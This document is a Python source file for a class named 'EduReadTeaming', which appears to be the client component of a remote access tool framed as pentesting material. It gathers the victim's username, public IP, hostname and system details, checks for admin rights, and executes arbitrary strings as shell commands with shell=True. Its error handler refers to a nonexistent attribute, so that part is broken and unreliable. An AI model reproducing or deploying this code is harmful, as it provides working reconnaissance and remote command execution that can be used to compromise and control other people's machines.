import requests
import subprocess
import sys
from getpass import getuser
from datetime import date
import psutil
import platform
import os


class EduReadTeaming:
    def __init__(self):
        print("Use it Responsibily! Like Pentesting in controlled environment!")

    def check_network(self):
        try:
            requests.get("https://google.com", timeout=5)
            print("Network is Working!")
            return True
        
        except:
            print("Network is not Working!")
            return False
        
    def check_Os(self):
        return platform.system()
        
    def is_admin(self):
        """
        Check if the script is running with administrator privileges.
        """
        if platform.system() == "Windows":
            import ctypes

            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0  # Linux/macOS
        

    def get_some_data(self):
        ip = requests.get("https://ifconfig.me").text
        message = f"Current Path: {sys.executable},\nUsername: {getuser()},\nPublic ip: {ip},\nToday's date: {str(date.today())}"
        return message

    def get_system_info(self):
        try:
            info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "OS Release": platform.release(),
                "Machine": platform.machine(),
                "Processor": platform.processor(),
                "CPU Cores (Physical)": psutil.cpu_count(logical=False),
                "CPU Cores (Logical)": psutil.cpu_count(logical=True),
                "CPU Frequency (MHz)": psutil.cpu_freq().current if psutil.cpu_freq() else None,
                "Total RAM (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
                "Python Version": platform.python_version(),
                "Hostname": platform.node(),
                "Current User": getuser()
            }
            return info
        except Exception as e:
            return {"Error": str(e)}
        
    def chdir(self, changeLocation):
        list_key = changeLocation.split(" ")

        try:
            os.chdir(" ".join(list_key[1:]))
            return f"Changed directory to: {os.getcwd()}"
        except Exception as e:
            return f"cd error: {e}"
        
    def command_execution(self, message):
            cmdd = message

            try:
                cc = subprocess.check_output(cmdd, shell=True, stderr=subprocess.STDOUT)

                return cc.decode(errors="ignore")
            except subprocess.CalledProcessError as e:
                return e.cc.decode(errors="ignore")